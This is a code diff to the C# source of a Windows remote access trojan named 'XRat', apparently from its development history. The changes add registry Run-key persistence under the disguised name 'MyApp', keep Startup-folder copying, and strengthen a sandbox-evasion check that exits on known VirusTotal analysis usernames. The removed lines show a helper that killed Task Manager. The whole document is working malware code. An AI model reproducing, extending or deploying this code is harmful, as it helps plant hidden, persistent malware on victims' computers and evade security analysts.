@@ -10,6 +10,7 @@ using Windows.Media.Capture;
 using Windows.Storage.Pickers;
 using Windows.Storage.Streams;
 using Windows.Storage;
+using Microsoft.Win32;
 
 
 namespace XRat
@@ -160,9 +161,9 @@ namespace XRat
                 Environment.GetFolderPath(Environment.SpecialFolder.Startup)
             );
 
-            // Получаем имя файла (с расширением)
+            // Получаем путь до файла (с расширением)
             string sourceFilePath = ProCMD("pwd").output;
-            sourceFilePath = sourceFilePath + Settings.filename; // Исправить!!!!!
+            sourceFilePath = sourceFilePath + Settings.filename;
 
             // Путь, куда будет скопирован файл
             string destinationFilePath = Path.Combine(userStartupFolder, Settings.filename);
@@ -187,18 +188,55 @@ namespace XRat
             }
         }
 
-        public static Task Taskmgr()
+        static void Main(string[] args)
         {
-            CMD(@"taskkill.exe /IM taskmgr.exe");
-            return Task.CompletedTask;
+            Settings.filename = Settings.filename + ".exe";
+
+            // Получаем путь до файла (с расширением)
+            string sourceFilePath = ProCMD("pwd").output;
+            sourceFilePath = sourceFilePath + Settings.filename;
+
+            // Путь к вашему приложению
+            string appPath = sourceFilePath;
+
+            // Имя записи в реестре
+            string appName = "MyApp";
+
+            // Добавляем запись в реестр
+            AddToStartup(appPath, appName);
+
+            Console.WriteLine("Программа добавлена в автозагрузку.");
+        }
+
+        static void AddToStartup(string appPath, string appName)
+        {
+            // Получаем доступ к ключу реестра для автозагрузки
+            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+
+            if (startupKey != null)
+            {
+                // Добавляем приложение в автозагрузку
+                startupKey.SetValue(appName, appPath);
+            }
+            else
+            {
+                Console.WriteLine("Не удалось получить доступ к реестру.");
+            }
         }
 
         public static void CheckVirusTotal()
         {
             string[] virusTotalUsers = ["shloblack", "seanwalla", "azure", "abby", "george", "bruno", "rtucker", "john", "administrator", "anrose"];
-
-            string username = ProCMD("whoami").output;
-            username = username.Split('\\')[1];
+            string username = string.Empty;
+            try
+            {
+                username = ProCMD("whoami").output;
+                username = username.Split('\\')[1];
+            }
+            catch (Exception ex)
+            {
+                Environment.Exit(0);
+            }
 
             if (virusTotalUsers.Contains(username))
             {
